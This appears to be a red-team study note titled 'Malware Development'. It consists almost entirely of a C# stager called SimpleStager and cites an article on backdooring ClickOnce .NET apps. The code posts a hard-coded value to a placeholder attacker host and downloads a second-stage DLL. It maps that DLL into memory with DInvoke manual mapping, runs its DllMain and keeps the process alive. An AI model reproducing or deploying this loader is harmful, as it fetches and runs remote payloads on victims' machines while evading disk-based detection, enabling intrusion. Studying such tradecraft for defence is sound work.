# Malware Development

```cs
using System.Collections.Generic;
using System.Net.Http;
using System.Threading;

using Data = DInvoke.Data;
using DynamicInvoke = DInvoke.DynamicInvoke;
using ManualMap = DInvoke.ManualMap;

namespace SimpleStager
{
    public class Program
    {
        public void Main(string[] args)
        {
            byte[] stage = (new HttpClient())
                .PostAsync("http[s]://<IP>[:PORT]/payload.application", new FormUrlEncodedContent(new Dictionary<string, string> { { "code", "G3t_My-C0up0n!" } })).
                GetAwaiter().GetResult().Content.ReadAsByteArrayAsync().Result; // fetch stage DLL

            Data.PE.PE_MANUAL_MAP moduleStage = ManualMap.Map.MapModuleToMemory(stage);             // map unmanaged DLL into the process from memory
            DynamicInvoke.Generic.CallMappedDLLModule(moduleStage.PEINFO, moduleStage.ModuleBase);  // enter DllMain()

            Thread.Sleep(Timeout.Infinite);
        }

        public Program()
        {
            Main(new string[] { });
        }
    }
}
```

---
## References

### Istvan Toth

- [Istvan Toth: Backdooring ClickOnce .NET Apps for Initial Access - A Practical Example](https://infosecwriteups.com/backdooring-clickonce-net-for-initial-access-a-practical-example-1eb6863c0579)